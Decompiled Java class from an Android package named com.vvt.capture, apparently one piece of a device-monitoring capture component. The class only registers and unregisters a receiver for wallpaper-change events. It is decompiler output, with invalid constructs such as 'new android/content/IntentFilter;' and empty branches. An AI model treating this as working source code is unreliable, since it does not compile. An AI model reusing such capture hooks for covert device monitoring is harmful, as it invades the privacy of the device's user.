package com.vvt.capture.f.a;

import android.content.Context;
import android.content.IntentFilter;

public class f
  extends a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private h c;
  private com.vvt.aj.a d;
  
  public f(com.vvt.capture.f.a parama)
  {
    super(parama);
  }
  
  public void a(Context paramContext)
  {
    boolean bool = b;
    if (bool) {}
    IntentFilter localIntentFilter = new android/content/IntentFilter;
    localIntentFilter.<init>("android.intent.action.WALLPAPER_CHANGED");
    h localh = this.c;
    if ((localh == null) && (paramContext != null))
    {
      localh = new com/vvt/capture/f/a/h;
      localh.<init>(this, null);
      this.c = localh;
      localh = this.c;
      paramContext.registerReceiver(localh, localIntentFilter);
      bool = b;
      if (!bool) {}
    }
    for (;;)
    {
      bool = b;
      if (bool) {}
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  public void b(Context paramContext)
  {
    boolean bool = b;
    if (bool) {}
    h localh = this.c;
    if ((localh != null) && (paramContext != null))
    {
      localh = this.c;
      paramContext.unregisterReceiver(localh);
      bool = b;
      if (!bool) {}
    }
    localh = null;
    this.c = null;
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */